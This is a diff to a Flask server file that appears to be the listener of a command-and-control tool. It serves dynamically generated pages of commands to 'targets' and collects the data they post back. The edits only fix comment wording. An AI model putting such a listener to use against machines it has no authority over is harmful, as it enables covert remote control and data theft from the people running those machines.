@@ -16,18 +16,18 @@ from db_controller import DBcontroller
 app = flask.Flask(__name__)
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
-#CAREFULL DEBUGGER MAKE THE MAIN MENU BUG
+#CAREFULL DEBUGGER MAKES THE MAIN MENU BUG
 #app.config["DEBUG"] = True
 #app.debug = True
 ips = []
 uniqueID = [None]
 
 @app.route('/<namelistener>', methods=['POST', 'GET'])
-#route is dinamicall since the pages are generated dynamically
+#route is dynamical since the pages are generated dynamically
 #see HTTPlistener.py listenerhttp() first line
 def home(namelistener):
     #return render_template('basicTemplates.html')
-    #GET wil display the asked page if it exist
+    #GET will display the asked page if it exists
     if flask.request.method == 'GET':
         ID = int(uniqueID[0])
 
@@ -50,7 +50,7 @@ def home(namelistener):
 
         return render_template(namelistener+'.html')
 
-    #the server will post the data given by the target back to me
+    #the server will post the data given by the target back to the user
     elif flask.request.method == 'POST':
         data = api_get_data(flask.request)
         print(data)
@@ -60,10 +60,10 @@ def home(namelistener):
     else:
         print("wrong way if this prints check api.py")
 
-#request have different forms
-#this function allows me to make sure the data from the target is returned to me
+#requests have different forms
+#this function allows the data from the target to be returned to the user
 def api_get_data(request):
-    #wether if it is .json or .form
+    #whether if it is .json or .form
     if not request.json:
         return request.form
     else:
@@ -72,16 +72,16 @@ def api_get_data(request):
 
 
 def runApi(x, y, ID):
-    #this line make sure the page is realoaded everytime
-    #in order to display new comands
+    #this line makes sure the page is reloaded everytime
+    #in order to display new commands
     app.config['TEMPLATES_AUTO_RELOAD'] = True
     uniqueID[0] = ID
     #start the server for given host and port
     app.run(host=x,port=y)
 
 def runApiSSL(x, y, z, ID):
-    #this line make sure the page is realoaded everytime
-    #in order to display new comands
+    #this line makes sure the page is reloaded everytime
+    #in order to display new multiline_commands
     app.config['TEMPLATES_AUTO_RELOAD'] = True
     z = z[0]
     #separate the cert and the key
